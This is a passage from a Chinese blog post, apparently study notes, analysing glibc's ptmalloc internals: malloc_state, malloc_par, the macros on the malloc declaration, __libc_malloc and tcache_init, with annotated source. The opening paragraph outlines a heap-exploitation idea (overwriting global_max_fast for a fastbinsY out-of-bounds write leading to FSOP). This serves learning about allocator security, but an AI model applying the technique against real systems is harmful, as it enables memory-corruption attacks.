<p>这个<code>global_max_fast</code>如果我们能泄露出libc就能根据偏移找到其位置。有些利用方式就是修改这个值，然后实现fastbinY数组越界写，让某个地方写上一个可控堆地址，进而利用(比如进行FSOP之类的)。</p>
<p>但是在glibc2.35(或者之前就有？至少glibc2.27是没有特判的)似乎进行了一些判断，从这个<code>get_max_fast</code>就可以看出，如果<code>global_max_fast</code>过大将调用<code>__builtin_unreachable</code>(这大概率是个抛出错误什么的)，而不是返回<code>global_max_fast</code></p>
<h5 id="malloc-state-与-malloc-par"><a href="#malloc-state-与-malloc-par" class="headerlink" title="malloc_state 与 malloc_par"></a>malloc_state 与 malloc_par</h5><p>这两个比较相似，我们首先说<code>malloc_state</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* Serialize access.  */</span></span><br><span class="line">    <span class="comment">//锁结构，保持数据一致性</span></span><br><span class="line">  __libc_lock_define (, mutex);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Flags (formerly in max_fast).  */</span></span><br><span class="line">  <span class="keyword">int</span> flags;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Set if the fastbin chunks contain recently inserted free blocks.  */</span></span><br><span class="line">  <span class="comment">/* Note this is a bool but not all targets support atomics on booleans.  */</span></span><br><span class="line">  <span class="keyword">int</span> have_fastchunks;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Fastbins */</span></span><br><span class="line">    <span class="comment">//fastbinsY数组，存放fastbin</span></span><br><span class="line">  mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></span><br><span class="line">    <span class="comment">//top chunk</span></span><br><span class="line">  mchunkptr top;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The remainder from the most recent split of a small request */</span></span><br><span class="line">  mchunkptr last_remainder;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">  <span class="comment">//bins数组</span></span><br><span class="line">  mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Bitmap of bins */</span></span><br><span class="line">  <span class="comment">//binmap，实现快速检索哪个bins有free chunk</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> binmap[BINMAPSIZE];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list */</span></span><br><span class="line">  <span class="comment">//多线程环境中可能有其他malloc_state，每个之间用next相连形成链表结构</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list for free arenas.  Access to this field is serialized</span></span><br><span class="line"><span class="comment">     by free_list_lock in arena.c.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Number of threads attached to this arena.  0 if the arena is on</span></span><br><span class="line"><span class="comment">     the free list.  Access to this field is serialized by</span></span><br><span class="line"><span class="comment">     free_list_lock in arena.c.  */</span></span><br><span class="line">  <span class="comment">//应该是使用这个arena的线程数</span></span><br><span class="line">  INTERNAL_SIZE_T attached_threads;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Memory allocated from the system in this arena.  */</span></span><br><span class="line">  INTERNAL_SIZE_T system_mem;</span><br><span class="line">  INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>通过对结构体成员的大致浏览也不难得出，这个结构体是一个类似管理员的角色，统一管理bins等结构。最为我们所熟知的是<code>main_arena</code>，他管理着主线程。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> <span class="title">main_arena</span> =</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  .mutex = _LIBC_LOCK_INITIALIZER,</span><br><span class="line">  .next = &amp;main_arena,</span><br><span class="line">  .attached_threads = <span class="number">1</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>还有一个类似的结构体叫做<code>malloc_par</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_par</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* Tunable parameters */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> trim_threshold;</span><br><span class="line">  INTERNAL_SIZE_T top_pad;</span><br><span class="line">  INTERNAL_SIZE_T mmap_threshold;</span><br><span class="line">  INTERNAL_SIZE_T arena_test;</span><br><span class="line">  INTERNAL_SIZE_T arena_max;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> HAVE_TUNABLES</span></span><br><span class="line">  <span class="comment">/* Transparent Large Page support.  */</span></span><br><span class="line">  INTERNAL_SIZE_T thp_pagesize;</span><br><span class="line">  <span class="comment">/* A value different than 0 means to align mmap allocation to hp_pagesize</span></span><br><span class="line"><span class="comment">     add hp_flags on flags.  */</span></span><br><span class="line">  INTERNAL_SIZE_T hp_pagesize;</span><br><span class="line">  <span class="keyword">int</span> hp_flags;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Memory map support */</span></span><br><span class="line">  <span class="keyword">int</span> n_mmaps;</span><br><span class="line">  <span class="keyword">int</span> n_mmaps_max;</span><br><span class="line">  <span class="keyword">int</span> max_n_mmaps;</span><br><span class="line">  <span class="comment">/* the mmap_threshold is dynamic, until the user sets</span></span><br><span class="line"><span class="comment">     it manually, at which point we need to disable any</span></span><br><span class="line"><span class="comment">     dynamic behavior. */</span></span><br><span class="line">  <span class="keyword">int</span> no_dyn_threshold;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Statistics */</span></span><br><span class="line">  INTERNAL_SIZE_T mmapped_mem;</span><br><span class="line">  INTERNAL_SIZE_T max_mmapped_mem;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* First address handed out by MORECORE/sbrk.  */</span></span><br><span class="line">  <span class="keyword">char</span> *sbrk_base;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* Maximum number of buckets to use.  */</span></span><br><span class="line">  <span class="keyword">size_t</span> tcache_bins;</span><br><span class="line">  <span class="keyword">size_t</span> tcache_max_bytes;</span><br><span class="line">  <span class="comment">/* Maximum number of chunks in each bucket.  */</span></span><br><span class="line">  <span class="keyword">size_t</span> tcache_count;</span><br><span class="line">  <span class="comment">/* Maximum number of chunks to remove from the unsorted list, which</span></span><br><span class="line"><span class="comment">     aren&#x27;t used to prefill the cache.  */</span></span><br><span class="line">  <span class="keyword">size_t</span> tcache_unsorted_limit;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>同样有一个类似于<code>main_arena</code>的角色，叫做<code>mp_</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_par</span> <span class="title">mp_</span> =</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  .top_pad = DEFAULT_TOP_PAD,</span><br><span class="line">  .n_mmaps_max = DEFAULT_MMAP_MAX,</span><br><span class="line">  .mmap_threshold = DEFAULT_MMAP_THRESHOLD,</span><br><span class="line">  .trim_threshold = DEFAULT_TRIM_THRESHOLD,</span><br><span class="line">#define NARENAS_FROM_NCORES(n) ((n) * (<span class="keyword">sizeof</span> (<span class="keyword">long</span>) == <span class="number">4</span> ? <span class="number">2</span> : <span class="number">8</span>))</span><br><span class="line">  .arena_test = NARENAS_FROM_NCORES (<span class="number">1</span>)</span><br><span class="line">#<span class="keyword">if</span> USE_TCACHE</span><br><span class="line">  ,</span><br><span class="line">  .tcache_count = TCACHE_FILL_COUNT,</span><br><span class="line">  .tcache_bins = TCACHE_MAX_BINS,</span><br><span class="line">  .tcache_max_bytes = tidx2usize (TCACHE_MAX_BINS<span class="number">-1</span>),</span><br><span class="line">  .tcache_unsorted_limit = <span class="number">0</span> <span class="comment">/* No limit.  */</span></span><br><span class="line">#endif</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="代码实现流程分析"><a href="#代码实现流程分析" class="headerlink" title="代码实现流程分析"></a>代码实现流程分析</h3><h4 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h4><p>我们看<code>malloc.h</code>文件，就会发现有个malloc函数的声明</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">void</span> *<span class="title">malloc</span> <span class="params">(<span class="keyword">size_t</span> __size)</span> __THROW __attribute_malloc__</span></span><br><span class="line"><span class="function">     __<span class="title">attribute_alloc_size__</span> <span class="params">((<span class="number">1</span>))</span> __wur</span>;</span><br></pre></td></tr></table></figure>
<p>嗯，其中的<code>__THROW __</code>、<code>attribute_malloc__</code> 以及<code>__attribute_alloc_size__ ((1))</code>、<code>__wur</code>都不认识（x</p>
<p>其中<code>__THROW</code>表明在C++下不抛出异常。绝大多数的C标准库函数不抛出异常。其中一个例外是使用函数指针作为参数的函数，例如qsort和bsearch。单纯C语言程序中此属性时没有作用。</p>
<p>其定义在misc/sys/cdefs.h中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/* GCC can always grok prototypes.  For C++ programs we add throw()</span></span><br><span class="line"><span class="comment">   to help it optimize the function calls.  But this works only with</span></span><br><span class="line"><span class="comment">   gcc 2.8.x and egcs.  For gcc 3.2 and up we even mark C functions</span></span><br><span class="line"><span class="comment">   as non-throwing using a function attribute since programs can use</span></span><br><span class="line"><span class="comment">   the -fexceptions options for C code as well.  */</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">if</span> !defined __cplusplus &amp;&amp; __GNUC_PREREQ (3, 3)</span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> __THROW       __attribute__ ((__nothrow__ __LEAF))</span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> __THROWNL     __attribute__ ((__nothrow__))</span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> __NTH(fct)    __attribute__ ((__nothrow__ __LEAF)) fct</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">if</span> defined __cplusplus &amp;&amp; __GNUC_PREREQ (2,8)</span></span><br><span class="line"><span class="meta">#   <span class="meta-keyword">define</span> __THROW      throw ()</span></span><br><span class="line"><span class="meta">#   <span class="meta-keyword">define</span> __THROWNL    throw ()</span></span><br><span class="line"><span class="meta">#   <span class="meta-keyword">define</span> __NTH(fct)   __LEAF_ATTR fct throw ()</span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#   <span class="meta-keyword">define</span> __THROW</span></span><br><span class="line"><span class="meta">#   <span class="meta-keyword">define</span> __THROWNL</span></span><br><span class="line"><span class="meta">#   <span class="meta-keyword">define</span> __NTH(fct)   fct</span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>
<p>而<code>__attribute_malloc__</code>是优化malloc函数的，其定义也在misc/sys/cdefs.h中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* At some point during the gcc 2.96 development the `malloc&#x27; attribute</span></span><br><span class="line"><span class="comment">   for functions was introduced.  We don&#x27;t want to use it unconditionally</span></span><br><span class="line"><span class="comment">   (although this would be possible) since it generates warnings.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> __GNUC_PREREQ (2,96)</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> __attribute_malloc__ __attribute__ ((__malloc__))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> __attribute_malloc__ <span class="comment">/* Ignore */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>
<p><code>__attribute_alloc_size__</code>,定义也在那个文件当中。用于告诉编译器函数返回值指向的内存。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Tell the compiler which arguments to an allocation function</span></span><br><span class="line"><span class="comment">   indicate the size of the allocation.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> __GNUC_PREREQ (4, 3)</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> __attribute_alloc_size__(params) \</span></span><br><span class="line">  __attribute__ ((__alloc_size__ params))</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> __attribute_alloc_size__(params) <span class="comment">/* Ignore.  */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>
<p>还有<code>__wur</code>，同样是在那个文件作用就是如果函数返回值没有被使用，则会抛出warning</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* If fortification mode, we warn about unused results of certain</span></span><br><span class="line"><span class="comment">   function calls which can lead to problems.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> __GNUC_PREREQ (3,4) || __glibc_has_attribute (__warn_unused_result__)</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> __attribute_warn_unused_result__ \</span></span><br><span class="line">   __attribute__ ((__warn_unused_result__))</span><br><span class="line"><span class="meta"># <span class="meta-keyword">if</span> defined __USE_FORTIFY_LEVEL &amp;&amp; __USE_FORTIFY_LEVEL &gt; 0</span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> __wur __attribute_warn_unused_result__</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> __attribute_warn_unused_result__ <span class="comment">/* empty */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __wur</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> __wur <span class="comment">/* Ignore */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>
<p>但是分析完了我们也没有发现malloc的实现，事实上我们在malloc.c中可以发现这个语句</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strong_alias (__libc_malloc, __malloc) strong_alias (__libc_malloc, <span class="built_in">malloc</span>)</span><br></pre></td></tr></table></figure>
<p>简单来说<code>strong_alias</code>是一个重命名的一个操作，这个宏定义也能找到，但是不是我们这里分析的重点。简而言之就是把<code>malloc</code>重命名为了<code>__libc_malloc</code>。所以这里<code>__libc_malloc</code>才是我们需要分析的目标函数</p>
<h5 id="libc-malloc函数"><a href="#libc-malloc函数" class="headerlink" title="__libc_malloc函数"></a>__libc_malloc函数</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *</span><br><span class="line">__libc_malloc (<span class="keyword">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="keyword">void</span> *victim;</span><br><span class="line"><span class="comment">//先不管</span></span><br><span class="line">  _Static_assert (PTRDIFF_MAX &lt;= SIZE_MAX / <span class="number">2</span>,</span><br><span class="line">                  <span class="string">&quot;PTRDIFF_MAX is not more than half of SIZE_MAX&quot;</span>);</span><br><span class="line"><span class="comment">//对全局变量__malloc_initialized进行检测，判断是否初始化，若为否则调用ptmalloc_init进行初始化</span></span><br><span class="line">  <span class="keyword">if</span> (!__malloc_initialized)</span><br><span class="line">    ptmalloc_init ();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* int_free also calls request2size, be careful to not pad twice.  */</span></span><br><span class="line">  <span class="keyword">size_t</span> tbytes;</span><br><span class="line">  <span class="comment">//调用checked_request2size，首先判断bytes的大小是否合理，然后调用宏request2size把用户申请的request大小转变成实际的chunk size大小，存放在tbytes中</span></span><br><span class="line">  <span class="keyword">if</span> (!checked_request2size (bytes, &amp;tbytes))</span><br><span class="line">    &#123;</span><br><span class="line">      __set_errno (ENOMEM);</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">   <span class="comment">//把tbytes转化成对应的tcache bin的idx</span></span><br><span class="line">  <span class="keyword">size_t</span> tc_idx = csize2tidx (tbytes);</span><br><span class="line"><span class="comment">//可能需要进行Tcache 初始化</span></span><br><span class="line">  MAYBE_INIT_TCACHE ();</span><br><span class="line"></span><br><span class="line">  DIAG_PUSH_NEEDS_COMMENT;</span><br><span class="line">  <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins</span><br><span class="line">      &amp;&amp; tcache</span><br><span class="line">      &amp;&amp; tcache-&gt;counts[tc_idx] &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      victim = tcache_get (tc_idx);</span><br><span class="line">      <span class="keyword">return</span> tag_new_usable (victim);</span><br><span class="line">    &#125;</span><br><span class="line">  DIAG_POP_NEEDS_COMMENT;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">    &#123;</span><br><span class="line">      victim = tag_new_usable (_int_malloc (&amp;main_arena, bytes));</span><br><span class="line">      assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">	      &amp;main_arena == arena_for_chunk (mem2chunk (victim)));</span><br><span class="line">      <span class="keyword">return</span> victim;</span><br><span class="line">    &#125;</span><br><span class="line">  arena_get (ar_ptr, bytes);</span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">  <span class="comment">/* Retry with another arena only if we were able to find a usable arena</span></span><br><span class="line"><span class="comment">     before.  */</span></span><br><span class="line">  <span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      LIBC_PROBE (memory_malloc_retry, <span class="number">1</span>, bytes);</span><br><span class="line">      ar_ptr = arena_get_retry (ar_ptr, bytes);</span><br><span class="line">      victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    __libc_lock_unlock (ar_ptr-&gt;mutex);</span><br><span class="line">  victim = tag_new_usable (victim);</span><br><span class="line">  assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">          ar_ptr == arena_for_chunk (mem2chunk (victim)));</span><br><span class="line">  <span class="keyword">return</span> victim;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (__libc_malloc) <span class="comment">//libc_hidden_def的作用:标志修饰的函数在动态链接的过程中进行延迟绑定。</span></span><br></pre></td></tr></table></figure>
<p>首先是进行了初始化操作,<code>ptmalloc_init</code>在后面分析了一些，建议先跳转到后面看一下，然后再回来(入栈式学习x)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!__malloc_initialized)</span><br><span class="line">	ptmalloc_init ();</span><br></pre></td></tr></table></figure>
<p>之后tbytes转化成对应的tcache bin的idx之后进行<code>MAYBE_INIT_TCACHE</code>，可能需要初始化Tcache，这个宏对应的是<code>tcache_init()</code>函数(如果没有USE_TCACHE的话就是无事发生)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">define</span> MAYBE_INIT_TCACHE() \</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (tcache == <span class="literal">NULL</span>)) \</span><br><span class="line">    tcache_init();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span>  <span class="comment">/* !USE_TCACHE */</span></span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> MAYBE_INIT_TCACHE()</span></span><br></pre></td></tr></table></figure>
<p>然后我们看看这个<code>tcache_init</code>函数(感觉这里应该归为下面的初始化操作),这个函数在之前介绍tcache的宏的时候说过，但是这里为了完整性还是再分析一下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">tcache_init(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="keyword">void</span> *victim = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//获取tcache_perthread_struct的size，</span></span><br><span class="line">   <span class="comment">//tcache_perthread_struct的定义如下,是一个存放tcache bin以及相应chunk数亮的结构体</span></span><br><span class="line">    <span class="comment">/*typedef struct tcache_perthread_struct</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">  uint16_t counts[TCACHE_MAX_BINS];</span></span><br><span class="line"><span class="comment">  tcache_entry *entries[TCACHE_MAX_BINS];</span></span><br><span class="line"><span class="comment">&#125; tcache_perthread_struct;   */</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">size_t</span> bytes = <span class="keyword">sizeof</span> (tcache_perthread_struct);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (tcache_shutting_down)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">    <span class="comment">//获取arena与victim内存</span></span><br><span class="line">  arena_get (ar_ptr, bytes);</span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">  <span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">//如果victim申请没成功，则再次调用申请，而ar_ptr似乎在arena_get_retry中被重置成了&amp;main_arena</span></span><br><span class="line">      ar_ptr = arena_get_retry (ar_ptr, bytes);</span><br><span class="line">      victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    __libc_lock_unlock (ar_ptr-&gt;mutex);</span><br><span class="line">  <span class="comment">/* In a low memory situation, we may not be able to allocate memory</span></span><br><span class="line"><span class="comment">     - in which case, we just keep trying later.  However, we</span></span><br><span class="line"><span class="comment">     typically do this very early, so either there is sufficient</span></span><br><span class="line"><span class="comment">     